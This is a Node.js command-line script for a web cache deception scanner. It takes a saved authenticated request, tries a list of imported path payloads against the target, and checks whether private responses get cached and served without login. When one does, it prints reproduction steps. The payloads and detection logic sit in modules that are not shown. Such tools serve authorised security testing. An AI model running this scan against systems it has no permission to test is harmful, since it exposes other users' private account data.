const minimist = require("minimist");
const payloads = require("./utils/payloads");
const { parseRawRequest } = require("./utils/req_parser");
const { sendRequest } = require("./utils/http");
const { testPayload } = require("./utils/detector");

const args = minimist(process.argv.slice(2));
const DEBUG = args.debug || false;

if (!args.req || !args["ch"]) {
  console.log("Usage: node index.js --req request.txt --ch X-Cache --debug");
  process.exit(1);
}

(async function main() {
  const CACHE_HEADER = args["ch"].toLowerCase();

  console.log("[*] Parsing raw request");
  const baseReq = parseRawRequest(args.req);

  console.log("[*] Sending baseline authenticated request");
  const baseline = await sendRequest(baseReq, false, DEBUG);

  console.log("Baseline hash:", baseline.hash);
  console.log("Baseline length:", baseline.length);

  for (const payload of payloads) {
    console.log(`\n[+] Testing payload: ${payload}`);

    const result = await testPayload(baseReq, payload, CACHE_HEADER, DEBUG);

    if (result.vulnerable) {
      console.log("\n🔥 WEB CACHE DECEPTION CONFIRMED 🔥\n");
      console.log("Payload:", result.payload);
      console.log("URL:", result.url);
      console.log("Cache Header:", CACHE_HEADER, "=", result.cacheHeader);
      console.log("Authenticated Hash:", result.authHash);
      console.log("Unauthenticated Hash:", result.unauthHash);

      console.log("\n--- Reproduction Steps ---");
      console.log("1. Login to the application");
      console.log(`2. GET ${result.url}`);
      console.log("3. Logout / remove cookies");
      console.log(`4. GET ${result.url}`);

      process.exit(0); // STOP ONLY AFTER CONFIRMATION
    }
  }

  console.log("\n[-] No cache deception detected across payload set");
})();
